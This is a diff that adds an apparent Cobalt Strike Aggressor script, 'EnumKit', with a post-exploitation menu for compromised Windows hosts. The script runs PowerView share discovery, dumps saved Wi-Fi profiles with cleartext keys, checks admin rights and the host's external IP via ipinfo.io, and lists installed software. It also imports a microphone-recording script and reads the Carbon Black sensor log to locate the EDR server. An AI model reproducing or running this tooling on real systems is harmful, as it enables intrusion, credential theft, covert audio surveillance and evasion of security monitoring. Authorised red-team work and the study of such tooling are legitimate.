@@ -1,0 +1,77 @@
+# Actions in this kit center around host and network enumeration. Credential enumeration actions should go in CredKit instead.
+# @Und3rf10w
+
+popup beacon_bottom {
+	menu "EnumKit" {
+		menu "PowerView"{
+			item "List accessible shares"{
+				local('$bid');
+				foreach $bid ($1){
+					binput($1, "powershell-import PowerView.ps1");
+					bpowershell_import($1, script_resource("EnumKit/scripts/PowerView.ps1"));
+					binput($1, "powershell Invoke-ShareFinder -CheckShareAccess");
+					bpowershell($1, "Invoke-ShareFinder -CheckShareAccess");
+				}
+			}
+		}
+		item "Determine Architecture (64 vs 32)" {
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "Get OS Architecture");
+				bshell($1, "wmic os get osarchitecture");
+			}
+		}
+		item "Show Host Uptime" {
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "Get Host Uptime");
+				bpowershell($1, "net statistics server| Select-String \"Statistics since\"");
+			}
+		}
+		item "List WLAN Profiles"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "shell netsh wlan show profiles name=\"*\" key=clear");
+				bshell($1, "netsh wlan show profiles name=\"*\" key=clear");
+			}
+		}
+		item "Is User Local Admin?"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell Is-UserLocalAdmin");
+				bpowershell($1, "([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")");
+			}
+		}
+		item "ipinfo.io Check"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell (New-Object System.Net.WebClient).DownloadString(\"http://ipinfo.io\")");
+				bpowershell($1, "(New-Object System.Net.WebClient).DownloadString(\"http://ipinfo.io\")");
+			}
+		}
+		item "List Installed Applications"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "shell wmic product get Name,Version,Description /format:csv");
+				bshell($1, "wmic product get Name,Version,Description /format:csv");
+			}
+		}
+		item "Import Get-MicrophoneAudio"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell-import Get-MicrophoneAudio.ps1");
+				bpowershell_import($1, script_resource("EnumKit/scripts/Get-MicrophoneAudio.ps1"));
+				blog($1, "Once imported, run \c8Get-Help Get-MicrophoneAudio -full\c0 for full usage instructions");
+			}
+		}
+		menu "Carbon Black"{
+			item "Get CB Server Location"{
+				local('$bid');
+				foreach $bid ($1){
+					binput($1, "shell type C:\\Windows\\CarbonBlack\\Sensor.LOG | findstr SensorBackendServer");
+					bshell($1, "type C:\\Windows\\CarbonBlack\\Sensor.LOG | findstr SensorBackendServer");
+				}
+			}
+		}
+	}
+}
